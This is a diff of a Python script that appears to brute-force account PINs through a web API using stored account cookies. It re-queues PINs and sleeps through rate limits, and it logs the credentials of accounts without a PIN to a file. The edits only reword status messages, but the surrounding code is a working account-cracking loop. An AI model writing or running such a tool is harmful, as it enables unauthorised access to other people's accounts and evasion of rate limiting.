@@ -46,16 +46,16 @@ while 1:
         elif 'errors' in r.json():
             code = r.json()['errors'][0]['code']
             if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
-                print(f'[FAILURE] Account cookie expired.')
+                print(f'[FAILURE] Account cookie expired')
                 break
             elif code == 1:
-                print(f'[SUCCESS] NO PIN')
+                print(f'[SUCCESS] no pin for this account')
                 with open('pins.txt','a') as f:
                     f.write(f'NO PIN:{credentials}\n')
                 break
             elif code == 3 or '"message":"TooManyRequests"' in r.text:
                 pins.insert(0, pin)
-                print(f'[{datetime.now()}] Sleeping for 5 minutes.')
+                print(f'[{datetime.now()}] Too many requests, retrying in 5 minutes.')
                 time.sleep(60*5)
             elif code == 4:
                 tried += 1
